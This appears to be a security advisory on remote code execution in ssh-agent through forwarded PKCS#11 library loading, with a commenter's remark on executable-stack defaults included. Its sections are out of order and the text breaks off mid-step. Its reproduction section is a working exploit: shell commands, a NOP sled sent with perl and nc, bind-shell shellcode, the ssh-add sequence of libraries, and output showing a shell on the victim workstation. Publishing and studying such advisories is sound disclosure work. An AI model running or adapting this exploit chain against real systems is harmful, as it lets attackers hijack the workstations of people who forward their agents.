  overwritten contents of the replacement memory mapping.

Although we successfully found various combinations of shared libraries
that overwrite a .data or .bss segment with a stack frame from a signal
handler, we failed to overwrite a useful memory mapping with useful data
(e.g., we failed to magically jump to the stack); for this attack to
work, more research and a finer-grained approach might be required.

========================================================================
Sigreturn to arbitrary instruction pointer
========================================================================

Astonishingly, numerous combinations of shared libraries crash because
they try to execute code at 0xcccccccccccccccc: a direct control of the
instruction pointer (RIP), because these 0xcc bytes come from the stack
buffer of ssh-pkcs11-helper that we (remote attackers) filled with 0xcc
bytes.

Initially, we got very excited by this new attack vector, because we
thought that a gadget of the form "add rsp, N; ret" was executed, thus
moving the stack pointer (RSP) into our 0xcc-filled stack buffer and
popping RIP from there. Unfortunately, the reality is more complex:

- a shared library raises a signal (a SIGSEGV in the example below, at
  line 134110) and, in consequence of a "Signal handler use-after-free",
  a replacement gadget of the form "ret N" is executed instead of the
  signal handler (at line 134111);

- exactly as the real signal handler would, the replacement gadget
  returns to the glibc's restore_rt() function (at line 134112), which
  in turn calls the kernel's rt_sigreturn() function (at line 134113);

- however, before the kernel's rt_sigreturn() function is called, the
  replacement gadget "ret N" moves RSP into our 0xcc-filled stack buffer
  and as a result, the kernel's rt_sigreturn() function restores all
  userland registers (including RIP and RSP) from there;

------------------------------------------------------------------------

Although we directly control all of the userland registers, we failed to
transform this attack vector into a one-shot remote exploit, because RSP
(which was conveniently pointing into our 0xcc-filled stack buffer) gets
overwritten, and because we were unable to leak any information from
ssh-pkcs11-helper (to defeat ASLR).

Partially overwriting a pointer that is left over in ssh-pkcs11-helper's
stack buffer, and that is later used by rt_sigreturn() to restore a
userland register, might be an interesting idea that we have not
explored yet.

========================================================================
_Unwind_Context type-confusion
========================================================================

This attack vector was the most puzzling of our discoveries: from time
to time, some combinations of shared libraries jumped to the stack, but
evidently not as a result of a signal handler, callback function, or
return from syscall use-after-free. Eventually, we determined the
sequence of events that led to these stack jumps:

- some shared libraries load LLVM's libunwind.so as a "nodelete" library
  (i.e., it is never unloaded, even after dlclose());

- some shared libraries throw a C++ exception, which loads GCC's
  libgcc_s.so and calls the _Unwind_GetCFA() function (at line 57295 in
  the example below);

- however, GCC's libgcc_s.so mistakenly calls LLVM's _Unwind_GetCFA()
  (at line 57298) instead of GCC's _Unwind_GetCFA() (because LLVM's
  libunwind.so was loaded first), and passes a pointer to GCC's struct
  _Unwind_Context to this function (instead of a pointer to LLVM's
  struct _Unwind_Context, which is a different type of structure);

- LLVM's _Unwind_GetCFA() then calls its unw_get_reg() function (at line
  57303), which in turn calls a function pointer (at line 57311) that is
  a member of LLVM's struct _Unwind_Context, but that happens to be a
  stack pointer in GCC's struct _Unwind_Context;

========================================================================
RCE in library constructor
========================================================================

As a last and extreme example of a remote attack against ssh-agent
forwarding, we noticed that one shared library's constructor function
(which can be invoked by a remote attacker via an ssh-agent forwarding)
starts a server thread that listens on a TCP port, and we discovered a
remotely exploitable vulnerability (a heap-based buffer overflow) in
this server's implementation.

The unusual malloc exploitation technique that we used to remotely
exploit this vulnerability is so interesting (it is reliable, one-shot,
and works against the latest glibc versions, despite all the modern
protections) that we decided to publish it in a separate advisory:

    <https://www.qualys.com/2023/06/06/renderdoc/renderdoc.txt>

This last and extreme attack vector against ssh-agent also underlines
the central point of this advisory: many shared libraries are simply not
safe to be loaded (and unloaded) in a security-sensitive program such as
ssh-agent.

========================================================================
Discussion
========================================================================

We believe that we have not exploited the full potential of this
"dlopen() then dlclose()" primitive:

- we have only investigated Ubuntu Desktop 22.04 and 21.10, but other
  versions, distributions, or operating systems might be hiding further
  surprises;

- our rudimentary fuzzer can certainly be greatly improved, and has
  definitely not tried all the combinations of shared libraries and side
  effects;

- we have identified seven attack vectors against ssh-agent (described
  in the "Results" section), but we have not analyzed in detail all the
  results of our fuzzer;

- we have not fully explored various aspects of these attack vectors:

  - it might be possible to reliably exploit the "Sigaltstack
    use-after-free" (by carefully overwriting the .data or .bss segment
    of a shared library) or the "Sigreturn to arbitrary instruction
    pointer" (by partially overwriting a leftover pointer in
    ssh-pkcs11-helper's stack);

  - we currently store our shellcode in ssh-pkcs11-helper's main() stack
    buffer only, but it might be possible to store shellcode in other
    stack buffers as well, or somehow spray the stack with shellcode,
    which would dramatically increase our chances of jumping into our
    shellcode;

    for example, we tried to spray the stack with shellcode by
    interrupting a memcpy() of controlled data with a signal handler,
    thereby spilling controlled YMM registers to the stack (inspired by
    <https://bugs.chromium.org/p/project-zero/issues/detail?id=2266>), but
    we failed because we can memcpy() only ~10KB of data, and because we
    cannot remotely use tricks such as inotify or sched*() to precisely
    time this race;

  - it might be possible to control the mmap layout of ssh-pkcs11-helper
    with page precision (which would allow us to precisely control the
    gadget that replaces the unmapped signal handler, callback function,
    or return from syscall), but we failed to find large malloc()ations
    (which are mmap()ed) in ssh-pkcs11-helper (the only way we found to
    influence the mmap layout is to load and unload shared libraries, as
    mentioned in Step 4a/ of the "Experiments" section);

  - instead of replacing the unmapped signal handler or callback
    function (or return from syscall) with a gadget from another shared
    library, it is perfectly possible to replace it with an executable
    thread stack (made executable by loading an "execstack" library),
    but we have failed so far to control the contents of such a thread
    stack.

I reported and tried to fix this in 2012: [https://lore.kernel.org/lkml/f298f914-2239-44e4-8aa1-a51282e7fac0@zmail15.collab.prod.int.phx2.redhat.com/](https://lore.kernel.org/lkml/f298f914-2239-44e4-8aa1-a51282e7fac0%40zmail15.collab.prod.int.phx2.redhat.com/), and more recently made a note about it at <https://rcvalle.com/2020/09/16/rust-exploit-mitigations/#appendix>. This is something I'd really like to see properly fixed. IMO, the READ_IMPLIES_EXEC personality needs to be completely separated from the PT_GNU_STACK program header by having a separate option for it (or setarch -X could just be used whenever READ_IMPLIES_EXEC is needed), and the absence of the PT_GNU_STACK program header needs to have more secure defaults (unrelated to READ_IMPLIES_EXEC).

    "ssh-agent is a program to hold private keys used for public key
    authentication. Through use of environment variables the agent can
    be located and automatically used for authentication when logging in
    to other machines using ssh(1). ... Connections to ssh-agent may be
    forwarded from further remote hosts using the -A option to ssh(1)
    (but see the caveats documented therein), avoiding the need for
    authentication data to be stored on other machines."
    (<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fman.openbsd.org%2Fssh-agent.1&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=yjcs4Ynt9Tc6YqjVRROv16ViQw3UbnTsOu4%2FpP6NkMk%3D&reserved=0><<https://man.openbsd.org/ssh-agent.1>>)

    "Agent forwarding should be enabled with caution. Users with the
    ability to bypass file permissions on the remote host ... can access
    the local agent through the forwarded connection. ... A safer
    alternative may be to use a jump host (see -J)."
    (<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fman.openbsd.org%2Fssh.1&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=U%2FkLvG5xpW91TcVhA%2FQQkXyDu6xkrFPFzxw%2BJH%2BhX%2FI%3D&reserved=0><<https://man.openbsd.org/ssh.1>>)

Despite this warning, ssh-agent forwarding is still widely used today.
Typically, a system administrator (Alice) runs ssh-agent on her local
workstation, connects to a remote server with ssh, and enables ssh-agent
forwarding with the -A or ForwardAgent option, thus making her ssh-agent
(which is running on her local workstation) reachable from the remote
server.

While browsing through ssh-agent's source code, we noticed that a remote
attacker, who has access to the remote server where Alice's ssh-agent is
forwarded to, can load (dlopen()) and immediately unload (dlclose()) any
shared library in /usr/lib* on Alice's workstation (via her forwarded
ssh-agent, if it is compiled with ENABLE_PKCS11, which is the default).

(Note to the curious readers: for security reasons, and as explained in
the "Background" section below, ssh-agent does not actually load such a
shared library in its own address space (where private keys are stored),
but in a separate, dedicated process, ssh-pkcs11-helper.)

Although this seems safe at first (because every shared library in
/usr/lib* comes from an official distribution package, and no operation
besides dlopen() and dlclose() is generally performed by ssh-agent on a
shared library), many shared libraries have unfortunate side effects
when dlopen()ed and dlclose()d, and are therefore unsafe to be loaded
and unloaded in a security-sensitive program such as ssh-agent. For
example, many shared libraries have constructor and destructor functions
that are automatically executed by dlopen() and dlclose(), respectively.

Surprisingly, by chaining four common side effects of shared libraries
from official distribution packages, we were able to transform this very
limited primitive (the dlopen() and dlclose() of shared libraries from
/usr/lib*) into a reliable, one-shot remote code execution in ssh-agent
(despite ASLR, PIE, and NX). Our best proofs of concept so far exploit
default installations of Ubuntu Desktop plus three extra packages from
Ubuntu's "universe" repository. We believe that even better results can
be achieved (i.e., some operating systems might be exploitable in their
default installation):

- we only investigated Ubuntu Desktop 22.04 and 21.10, we have not
  looked into any other versions, distributions, or operating systems;

- the "fuzzer" that we wrote to test our ideas is rudimentary and slow,
  and we ran it intermittently on a single laptop, so we have not tried
  all the combinations of shared libraries and side effects;

- we initially had only one attack vector in mind (i.e., one specific
  combination of side effects from shared libraries), but we discovered
  six more while analyzing the results of our fuzzer, and we are
  convinced that more attack vectors exist.

In this advisory, we present our research, experiments, reproducible
results, and further ideas to exploit this "dlopen() then dlclose()"
primitive. We will also publish the source code of our crude fuzzer at
<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fwww.qualys.com%2Fresearch%2Fsecurity-advisories%2F&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=%2FMbEJy3RvkLHTGFD6%2F86IiR7qw78xm9XQqA6xOkOoqs%3D&reserved=0><<https://www.qualys.com/research/security-advisories/>> (warning: this code
might hurt the eyes of experienced fuzzing practitioners, but it gave us
quick answers to our many questions; it is provided "as is", in the hope
that it will be useful).

========================================================================
Background
========================================================================

The ability to load and unload shared libraries in ssh-agent was
developed in 2010 to support the addition and deletion of PKCS#11 keys:
ssh-agent forks and executes a long-running ssh-pkcs11-helper process
that dlopen()s PKCS#11 providers (shared libraries), and immediately
dlclose()s them if the symbol C_GetFunctionList cannot be found (i.e.,
if such a shared library is not actually a PKCS#11 provider, which is
the case for the vast majority of the shared libraries in /usr/lib*).

Note: ssh-agent also supports the addition of FIDO keys, by loading a
FIDO authenticator (a shared library) in a short-lived ssh-sk-helper
process; however, unlike ssh-pkcs11-helper, ssh-sk-helper is stateless
(it terminates shortly after loading a single shared library) and can
therefore not be abused by an attacker to chain the side effects of
several shared libraries.

Originally, the path of a shared library to be loaded in
ssh-pkcs11-helper was not filtered at all by ssh-agent, but in 2016 an
allow-list was added ("/usr/lib*/*,/usr/local/lib*/*" by default) in
response to CVE-2016-10009, which was published by Jann Horn (at
<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fbugs.chromium.org%2Fp%2Fproject-zero%2Fissues%2Fdetail%3Fid%3D1009&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=j6hw2is5FhLWmZ3VfQPPXp%2Bg7VLQlBWEVxYnK%2BSuIyY%3D&reserved=0>):<<https://bugs.chromium.org/p/project-zero/issues/detail?id=1009>>

- if an attacker had access to the server where Alice's ssh-agent is
  forwarded to, and had an unprivileged access to Alice's workstation,
  then this attacker could store a malicious shared library in /tmp on
  Alice's workstation and execute it with Alice's privileges (via her
  forwarded ssh-agent) -- a mild form of Local Privilege Escalation;

- if the attacker had only access to the server where Alice's ssh-agent
  is forwarded to, but could somehow store a malicious shared library
  somewhere on Alice's workstation (without access to her workstation),
  then this attacker could remotely execute this shared library (via
  Alice's forwarded ssh-agent) -- a mild form of Remote Code Execution.

Our first reaction was of course to try to bypass ssh-agent's /usr/lib*
allow-list:

- by finding a logic bug in the filter function, match_pattern_list()
  (but we failed);

- by making a path-traversal attack, for example /usr/lib/../../tmp (but
  we failed, because ssh-agent first calls realpath() to canonicalize
  the path of a shared library, and then calls the filter function);

- by finding a locally or remotely writable file or directory in
  /usr/lib* (but we failed).

Our only option, then, is to abuse side effects of the existing shared
libraries in /usr/lib*; in particular, their constructor and destructor
functions, which are automatically executed by dlopen() and dlclose().
Eventually, we realized that this is essentially a remote version of
CVE-2010-3856, which was published in 2010 by Tavis Ormandy (at
<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fseclists.org%2Ffulldisclosure%2F2010%2FOct%2F344&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=%2FbjeLJwIbyFiW3Vo2r9Rj%2Fo6LACJqDegnjxx1zN5JOQ%3D&reserved=0>):<<https://seclists.org/fulldisclosure/2010/Oct/344>>

- an unprivileged local attacker could dlopen() any shared library from
  /lib and /usr/lib (via the LD_AUDIT environment variable), even when
  executing a SUID-root program;

- the constructor functions of various common shared libraries created
  files and directories whose location depended on the attacker's
  environment variables and whose creation mode depended on the
  attacker's umask;

- the local attacker could therefore create world-writable files and
  directories anywhere in the filesystem, and obtain full root
  privileges (via crond, for example).

Although the ability to load and unload shared libraries from /usr/lib*
in ssh-agent bears a striking resemblance to CVE-2010-3856, we are in a
much weaker position here, because we are trying to exploit ssh-agent
remotely, so we do not control its environment variables nor its umask
(and we do not even talk directly to ssh-pkcs11-helper, which actually
dlopen()s and dlclose()s the shared libraries: we talk to ssh-agent,
which canonicalizes and filters our requests before passing them on to
ssh-pkcs11-helper).

In fact, we do not control anything except the order in which we load
(and immediately unload) shared libraries from /usr/lib* in ssh-agent.
At that point, we almost abandoned our research, because we could not
possibly imagine how to transform this extremely limited primitive into
a one-shot remote code execution. Nevertheless, we felt curious and
decided to syscall-trace (strace) a dlopen() and dlclose() of every
shared library in the default installation of Ubuntu Desktop. We
instantly observed four surprising behaviors:

------------------------------------------------------------------------

1/ Some shared libraries require an executable stack, either explicitly
because of an RWE (readable, writable, executable) GNU_STACK ELF header,
or implicitly because of a missing GNU_STACK ELF header (in which case
the loader defaults to an executable stack): when such an "execstack"
library is dlopen()ed, the loader makes the main stack and all thread
stacks executable, and they remain executable even after dlclose().

For example, /usr/lib/systemd/boot/efi/linuxx64.elf.stub in the default
installation of Ubuntu Desktop 22.04.

------------------------------------------------------------------------

2/ Many shared libraries are marked as "nodelete" by the loader, either
explicitly because of a NODELETE ELF flag, or implicitly because they
are in the dependency list of a NODELETE library: the loader will never
unload (munmap()) such libraries, even after they are dlclose()d.

For example, /usr/lib/x86_64-linux-gnu/librt.so.1 in the default
installation of Ubuntu Desktop 22.04 and 21.10.

------------------------------------------------------------------------

3/ Some shared libraries register a signal handler for SIGSEGV when they
are dlopen()ed, but they do not deregister this signal handler when they
are dlclose()d (i.e., this signal handler is still registered when its
code is munmap()ed).

For example, /usr/lib/x86_64-linux-gnu/libSegFault.so in the default
installation of Ubuntu Desktop 21.10.

------------------------------------------------------------------------

4/ Some shared libraries crash with a SIGSEGV as soon as they are
dlopen()ed (usually because of a NULL-pointer dereference), because they
are supposed to be loaded in a specific context, not in a random program
such as ssh-agent.

For example, most of the /usr/lib/x86_64-linux-gnu/xtables/lib*.so in
the default installation of Ubuntu Desktop 22.04 and 21.10.

------------------------------------------------------------------------

And so an exciting idea to remotely exploit ssh-agent came into our
mind:

a/ make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack) by dlopen()ing one of the "execstack"
libraries ("surprising behavior 1/"), and somehow store a 1990-style
shellcode somewhere in this executable stack;

b/ register a signal handler for SIGSEGV and immediately munmap() its
code, by dlopen()ing and dlclose()ing one of the shared libraries from
"surprising behavior 3/" (consequently, a dangling pointer to this
unmapped signal handler is retained in the kernel);

c/ replace the unmapped signal handler's code with another piece of code
from another shared library, by dlopen()ing (mmap()ing) one of the
"nodelete" libraries ("surprising behavior 2/");

d/ raise a SIGSEGV by dlopen()ing one of the shared libraries from
"surprising behavior 4/", so that the unmapped signal handler is called
by the kernel, but the replacement code from the "nodelete" library is
executed instead (a use-after-free of sorts);

e/ hope that this replacement code (which is mapped where the signal
handler was mapped) is a useful gadget that somehow jumps into the
executable stack, exactly where our shellcode is stored.

========================================================================
Experiments
========================================================================

But "hope is not a strategy", so we decided to implement the following
6-step plan to test our remote-exploitation idea in ssh-agent:

------------------------------------------------------------------------

Step 1 - We install a default Ubuntu Desktop, download all official
packages from Ubuntu's "main" and "universe" repositories, and extract
all /usr/lib* files from these packages. These files occupy ~200GB of
disk space and include ~60,000 shared libraries.

Note: after the default installation of Ubuntu Desktop, but before the
extraction of all /usr/lib* files, we "chattr +i /etc/ld.so.cache" to
make sure that this file does not grow unrealistically (from kilobytes
to megabytes); indeed, it is mmap()ed by the loader every time dlopen()
is called, and a large file might therefore destroy the mmap layout and
prevent our fuzzer's results from being reproducible in the real world.

------------------------------------------------------------------------

Step 2 - For each shared library in /usr/lib*, we fork and execute
ssh-pkcs11-helper, strace it, and request it to dlopen() (and hence
immediately dlclose()) this shared library; if we spot anything unusual
in the strace logs (a raised signal, a clone() call, etc) or outstanding
differences in /proc/pid/maps or /proc/pid/status between before and
after dlopen() and dlclose(), then we mark this shared library as
interesting.

------------------------------------------------------------------------

Step 3 - We analyze the results of Step 2. For example, on Ubuntu
Desktop 22.04:

- 58 shared libraries make the stack executable when dlopen()ed (and the
  stack remains executable even after dlclose());

- 16577 shared libraries permanently alter the mmap layout when
  dlopen()ed (either because they are "nodelete" libraries, or because
  they allocate a thread stack or otherwise leak mmap()ed memory);

- 9 shared libraries register a SIGSEGV handler when dlopen()ed (but do
  not deregister it when dlclose()d), and 238 shared libraries raise a
  SIGSEGV when dlopen()ed;

- 2 shared libraries register a SIGABRT handler when dlopen()ed, and 44
  shared libraries raise a SIGABRT when dlopen()ed.

On Ubuntu Desktop 21.10:

- 30 shared libraries make the stack executable;

- 16172 shared libraries permanently alter the mmap layout;

- 9 shared libraries register a SIGSEGV handler, and 147 shared
  libraries raise a SIGSEGV;

- 2 shared libraries register a SIGABRT handler, and 38 shared libraries
  raise a SIGABRT;

- 1 shared library registers a SIGBUS handler, and 11 shared libraries
  raise a SIGBUS;

- 1 shared library registers a SIGCHLD handler, and 61 shared libraries
  raise a SIGCHLD;

- 1 shared library registers a SIGILL handler, and 1 shared library
  raises a SIGILL.

------------------------------------------------------------------------

Step 4 - We implement a rudimentary fuzzing strategy, by forking and
executing ssh-pkcs11-helper in a loop, and by loading (and unloading)
random combinations of the interesting shared libraries from Step 3:

a/ we randomly load zero or more shared libraries that permanently alter
the mmap layout, in the hope of creating holes in the mmap layout, thus
potentially shifting the replacement code (which will later replace the
signal handler's code) with page precision;

b/ we randomly load one shared library that registers a signal handler
but does not deregister it when dlclose()d (i.e., when munmap()ed);

c/ we randomly load zero or more shared libraries that alter the mmap
layout (again), thus replacing the unmapped signal handler's code with
another piece of code (a hopefully useful gadget) from another shared
library (a "nodelete" library);

d/ we randomly load one shared library that raises the signal that is
caught by the unmapped signal handler: the replacement code (gadget) is
executed instead, and if it jumps into the stack (a SEGV_ACCERR with a
RIP register that points to the stack, because we did not make the stack
executable in this Step 4), then we mark this particular combination of
shared libraries as interesting.

Surprise: we actually get numerous jumps to the stack in this Step 4,
usually because the signal handler's code is replaced by a "jmp REG",
"call REG", or "pop; pop; ret" gadget, and the "REG" or popped RIP
register happens to point to the stack at the time of the jump.

------------------------------------------------------------------------

Step 5 - We implement this extra step to test whether the interesting
combinations of shared libraries from Step 4 actually jump into our
shellcode in the stack, or into uncontrolled data in the stack:

a/ we make the stack executable, by randomly loading one of the
"execstack" libraries from Step 3;

b/ we store ~10KB of 0xcc bytes in the stack buffer "buf" of
ssh-pkcs11-helper's main() function: 10KB is the maximum message length
that we can send to ssh-pkcs11-helper (via ssh-agent), and on amd64 0xcc
is the "int3" instruction that generates a SIGTRAP when executed;

c/ we randomly replay one of the interesting combinations of shared
libraries from Step 4: if a SIGTRAP is generated while the RIP register
points to the stack, then there is a fair chance that ssh-pkcs11-helper
jumped into our shellcode (our 0xcc bytes) in the executable stack.

Surprise: we actually get many SIGTRAPs in the stack during this Step 5,
but to our great dismay, most of these SIGTRAPs are generated because
ssh-pkcs11-helper jumps into the stack, in the middle of a pointer that
is stored on the stack and that happens to contain a 0xcc byte because
of ASLR (i.e., not because ssh-pkcs11-helper jumps into our own 0xcc
bytes in the stack).

------------------------------------------------------------------------

Step 6 - We implement this extra step to eliminate the false positives
produced by Step 5:

a/ we repeatedly replay (N times) each combination of shared libraries
that generates a SIGTRAP in the stack: if N SIGTRAPs are generated out
of N replays, then there is an excellent chance that ssh-pkcs11-helper
does indeed jump into our shellcode (our 0xcc bytes) in the stack (and
not into random bytes that happen to be 0xcc because of ASLR);

b/ if this is confirmed by a manual check (with gdb for example), then
we achieved a reliable, one-shot remote code execution in ssh-agent,
despite the very limited primitive, and despite ASLR, PIE, and NX.

Signal handler use-after-free (Ubuntu Desktop 22.04)
========================================================================

This was our original idea for remotely attacking ssh-agent, as
discussed at the end of the "Background" section and as implemented in
the "Experiments" section. In this subsection, we present one of the
various combinations of shared libraries that result in a reliable,
one-shot remote code execution in ssh-agent on Ubuntu Desktop 22.04.

------------------------------------------------------------------------

1a/ On our local workstation, we install a default Ubuntu Desktop 22.04
(<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fold-releases.ubuntu.com%2Freleases%2F22.04%2Fubuntu-22.04-desktop-amd64.iso&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=Asi2VKNB1zU3PO0i%2B2M%2BotE7IgNbsWyWVKhL2XmAVeY%3D&reserved=0><<https://old-releases.ubuntu.com/releases/22.04/ubuntu-22.04-desktop-amd64.iso>>),
without connecting this workstation to the Internet.

------------------------------------------------------------------------

1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:

workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# grep ' jammy ' /etc/apt/sources.list.backup > /etc/apt/sources.list

------------------------------------------------------------------------

1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three shared libraries used in this particular attack against ssh-agent:

workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install eclipse-titan
workstation# apt-get --no-install-recommends install libkf5sonnetui5
workstation# apt-get --no-install-recommends install libns3-3v5

------------------------------------------------------------------------

2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)

workstation$ eval `ssh-agent -s`
Agent pid 1105

workstation$ echo /tmp/ssh-*/agent.*
/tmp/ssh-XXXXXXmgHTo9/agent.1104

workstation$ ssh -A server

server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)

server$ echo /tmp/ssh-*/agent.*
/tmp/ssh-N5EjHljGRh/agent.1299

------------------------------------------------------------------------

3/ Then, as a remote attacker who has access to this server:

------------------------------------------------------------------------

3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding (indeed,
the ssh-agent itself is running on Alice's workstation, not on the
server):

server# echo /tmp/ssh-*/agent.*
/tmp/ssh-N5EjHljGRh/agent.1299

server# export SSH_AUTH_SOCK=/tmp/ssh-N5EjHljGRh/agent.1299

server# ssh-add -s /usr/lib/systemd/boot/efi/linuxx64.elf.stub
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/systemd/boot/efi/linuxx64.elf.stub": agent refused operation

------------------------------------------------------------------------

3b/ we remotely store a shellcode in the stack buffer "buf" of
ssh-pkcs11-helper's main() function:

server# SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'

server# (perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n "$SHELLCODE") | nc -U "$SSH_AUTH_SOCK"
[Press Ctrl-C after a few seconds.]

- we do not use ssh-add here, because we want to send a ~10KB passphrase
  (our shellcode) to ssh-agent, but ssh-add limits the length of our
  passphrase to 1KB;

- "\x90" x 10000 is a ~10KB "NOP sled" (on amd64, 0x90 is the "nop"
  instruction);

- SHELLCODE is a "TCP bind shell" on port 31337 (from
  <https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fshell-storm.org%2Fshellcode%2Ffiles%2Fshellcode-858.html&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=Kk1ZEIG3Eu6RBz4ODQ2Ojr%2Ba3H%2F5d1RpGm7TcCJzaUU%3D&reserved=0>)<<https://shell-storm.org/shellcode/files/shellcode-858.html>>;

- /usr/lib/modules is an existing directory whose path matches
  ssh-agent's /usr/lib* allow-list (indeed, we do not want to actually
  load a shared library here -- we just want to store our shellcode in
  the executable stack);

------------------------------------------------------------------------

3c/ we remotely register a SIGSEGV handler, and immediately munmap() its
code:

server# ssh-add -s /usr/lib/titan/libttcn3-rt2-dynamic.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/titan/libttcn3-rt2-dynamic.so": agent refused operation

------------------------------------------------------------------------

3d/ we remotely replace the unmapped SIGSEGV handler's code with another
piece of code (a useful gadget) from another shared library:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0": agent refused operation

------------------------------------------------------------------------

3e/ we remotely raise a SIGSEGV in ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libns3.35-wave.so.0.0.0
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3f/ the replacement code (gadget) is executed (instead of the unmapped
SIGSEGV handler's code) and jumps to the stack, into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:

server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/*] succeeded!

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)

workstation$ ps axuf

------------------------------------------------------------------------

To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGSEGV handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:

workstation$ gdb /usr/lib/openssh/ssh-pkcs11-helper 1307

Signal handler use-after-free (Ubuntu Desktop 21.10)
========================================================================

In this subsection, we present one of the various combinations of shared
libraries that result in a reliable, one-shot remote code execution in
ssh-agent on Ubuntu Desktop 21.10.

------------------------------------------------------------------------

1a/ On our local workstation, we install a default Ubuntu Desktop 21.10
